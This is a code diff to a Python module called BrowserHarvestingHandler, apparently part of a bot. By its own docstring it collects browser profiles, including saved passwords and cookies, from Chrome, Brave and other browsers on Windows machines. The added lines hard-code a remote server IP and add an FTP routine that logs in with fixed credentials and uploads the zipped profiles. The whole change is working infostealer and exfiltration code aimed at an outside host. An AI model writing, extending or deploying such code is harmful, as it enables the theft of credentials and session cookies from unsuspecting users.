@@ -1,8 +1,11 @@
 import typing
+from uuid import uuid4
+
 from bot.objects.Logger import Logger
 import winreg
 import shutil
 import os
+from ftplib import FTP
 """
 The purpose of this handler is to provide sensitive information about every installed browser on the machine.
 browser profile is a folder, which can be loaded to the browser and contains every information(password, cookies etc.)
@@ -10,6 +13,7 @@ about the default user.
 """
 
 class BrowserHarvestingHandler:
+    SERVER_ADDRESS = os.getenv("MVP_SERVER_URL", "http://40.118.19.45/")
     BROWSER_PROFILE_PATH = {
         "Google Chrome": r"%LOCALAPPDATA%/Google/Chrome/User Data/Default",
         "Brave": r"%LOCALAPPDATA%/BraveSoftware/Brave-Browser/User Data/Default",
@@ -75,6 +79,13 @@ class BrowserHarvestingHandler:
         """
         key = winreg.OpenKey(hkey, keypath, 0, winreg.KEY_READ)
         return self.subkeys(key=key)
+
+    def send_file_to_server(self,file_path:str):
+        ftp_client = FTP(self.SERVER_ADDRESS)
+        ftp_client.login(user='tin',passwd='tin')
+        ftp_client.cwd('browser_profiles')
+        with open(file_path,'rb') as file:
+            ftp_client.storbinary(f'STOR {uuid4().__str__() + ".zip"}',file)
 
 if __name__ == '__main__':
     handler = BrowserHarvestingHandler(task_id="browser_handler_try")
